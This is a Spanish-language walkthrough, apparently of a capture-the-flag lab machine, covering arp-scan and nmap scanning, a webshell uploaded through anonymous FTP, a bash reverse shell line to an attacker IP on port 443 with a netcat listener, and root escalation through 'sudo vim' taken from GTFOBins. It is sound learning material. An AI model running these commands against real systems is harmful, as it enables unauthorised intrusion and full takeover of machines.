<p>En este reto nos encontramos con escaneo , configuracion erronea en uno de sus servicios y escalado de privilegios con binario.</p>

<p>Este es el primer reto que consiguo hacer solo consultando la web de gotfbins para saber para aprender como usar el binario.</p>

<p><img src="assets/images_friendly/friendly1.png" alt="portada" /></p>

<h2 id="herramientas-y-recursos-web-utilizados">Herramientas y recursos web utilizados</h2>

<ul>
  <li>arp-scan</li>
  <li>nmap</li>
  <li><a href="https://gtfobins.github.io/">gotfbins</a></li>
</ul>

<h3 id="escaneo">Escaneo</h3>

<p>Empezamos averiguando la ip de la maquina victima para ello ejecutamos la herramienta arp-scan nos fijamos en el resultado y buscamos la mac que empieza por 08:00 esa mac es de virtualbox.</p>

<p>Ejecutamos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>arp-scan <span class="nt">--localnet</span>
</code></pre></div></div>
<p><img src="assets/images_friendly/arp-scan.png" alt="arp" /></p>

<p>Una vez obtenida la ip pasamos al escanear puertos</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-A</span> <span class="nt">-p-</span> <span class="nt">--min-rate</span> 5000 <span class="nv">$ip</span>
</code></pre></div></div>
<p><img src="assets/images_friendly/nmap.png" alt="nmap" /></p>

<h3 id="intrusion">Intrusion</h3>

<p>Vemos que tiene el 21 y el 80 abierto en el 21 tenemos login anonynous y nos permite subir ficheros.</p>

<p>Nos subimos un webshell al servidor que podemos encontrar en github.</p>

<p>Creamos un archivo .html con el siguiente contenido , lo subimos y posteriormente lo ejecutamos a traves del webshell que subimos</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/bash bash -i &gt;<span class="err">&amp;</span> /dev/tcp/192.168.0.112/443 0&gt;<span class="err">&amp;</span>1
</code></pre></div></div>

<p><img src="assets/images_friendly/webshell.png" alt="webshell" /></p>

<p>Antes de ejecutar desde el webshell el archivo que subimos debemos ponernos con netcat a la escucha.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lnvp</span> 443
</code></pre></div></div>
<p><img src="assets/images_friendly/respuestanc.png" alt="nc" /></p>

<h3 id="escalada">Escalada</h3>

<p>Una vez con la tty en nuestra maquina atacante buscamos binarios por con permisos para ello probamos primero un :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span>
</code></pre></div></div>
<p><img src="assets/images_friendly/sudo-l.png" alt="sudo" /></p>

<p>El binario que nos muestra nos sirve para la escalada de privilegios
podemos vistar gtofbins para consulta</p>

<p>Ahora ejecutamos vim como se indica <a href="https://gtfobins.github.io/">gotfbins</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>vim <span class="nt">-c</span> <span class="s1">':!/bin/sh'</span>
</code></pre></div></div>
<p>Obtendremos automaticamente root</p>

<p><img src="assets/images_friendly/rootuser.png" alt="root" /></p>

<p>Si os interesan las flags no os olvideis de buscarlas .</p>

<p>Gracias por leer este reto.</p>
